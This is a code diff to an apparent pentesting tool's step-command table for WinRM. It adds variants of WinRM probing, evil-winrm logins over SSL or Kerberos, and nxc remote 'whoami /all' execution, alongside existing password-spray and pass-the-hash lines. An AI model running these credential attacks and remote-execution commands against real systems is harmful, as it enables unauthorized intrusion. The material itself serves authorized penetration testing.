@@ -4206,6 +4206,7 @@ _STEP_COMMANDS = {
             "nxc winrm <RHOST>",
             "nmap -p5985,5986 --script http-title <RHOST>",
             "curl -sk http://<RHOST>:5985/wsman -X POST -i",
+            "curl -sk https://<RHOST>:5986/wsman -X POST -i",
         ],
         2: [
             "nxc winrm <RHOST> -u /usr/share/seclists/Usernames/Names/names.txt -p /usr/share/wordlists/rockyou.txt --continue-on-success",
@@ -4218,7 +4219,11 @@ _STEP_COMMANDS = {
         4: [
             "evil-winrm -i <RHOST> -u <USER> -p <PASS>",
             "evil-winrm -i <RHOST> -u <USER> -H <NTHASH>",
+            "evil-winrm -i <RHOST> -u <USER> -p <PASS> -S",
+            "evil-winrm -i <RHOST> -u <USER> -r <DOMAIN>",
             "nxc winrm <RHOST> -u <USER> -p <PASS> -x 'whoami /all'",
+            "nxc winrm <RHOST> -u <USER> -p <PASS> --ssl -x 'whoami /all'",
+            "nxc winrm <RHOST> -u <USER> -p <PASS> -k -x 'whoami /all'",
         ],
         5: [
             "# HackTricks WinRM: https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm",
